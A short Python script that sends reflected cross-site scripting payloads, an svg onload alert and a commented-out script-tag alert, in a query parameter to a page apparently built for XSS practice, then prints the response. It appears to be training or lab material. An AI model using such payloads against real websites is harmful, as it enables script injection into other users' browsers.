#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

# payload = '</script><script>alert(1+2)</script>'
payload = '</script><svg/onload=alert(1+1)>'

params = {'p11': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
